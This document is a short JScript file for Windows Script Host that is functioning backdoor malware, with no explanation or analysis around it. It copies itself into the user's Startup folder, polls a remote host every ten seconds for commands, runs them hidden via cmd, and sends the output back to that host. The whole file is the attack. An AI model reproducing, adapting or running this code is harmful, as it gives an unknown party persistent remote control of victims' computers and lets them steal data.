var fs = WScript.CreateObject("Scripting.FileSystemObject");
var shell = WScript.CreateObject("WScript.Shell");

fs.CopyFile(WScript.ScriptFullName, shell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + WScript.ScriptName));

while(true){
	var xmlhttp = WScript.CreateObject("Microsoft.XMLHTTP");


	xmlhttp.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/USER_ID.txt?rand=" + new Date().getTime(), false);
	xmlhttp.setRequestHeader('Cache-Control', 'no-cache, no-store, max-age=0');
	xmlhttp.setRequestHeader("Expires", "Tue, 01 Jan 1980 1:00:00 GMT");
	xmlhttp.Send();
	tmp();
	function tmp(){
		if(xmlhttp.status != 200){
			cmd = "null";
			return;
		}
		cmd = xmlhttp.responseText;
		if(cmd != "null"){
			shell.Run('cmd /c "' + cmd + ' > %temp%\\syslog.dat"', 0);
			var _ = WScript.CreateObject("Microsoft.XMLHTTP");
			_.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/getfile.php?fn=USER_ID.txt&data=null", false);
			_.Send();
			
			var __ = WScript.CreateObject("Microsoft.XMLHTTP");
			__.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/getfile.php?fn=USER_ID.result.txt&data=" + fs.OpenTextFile(shell.ExpandEnvironmentStrings("%TEMP%\\syslog.dat"), 1).ReadAll(), false);
			__.Send();
		}
	}
	WScript.Sleep(10000);
}
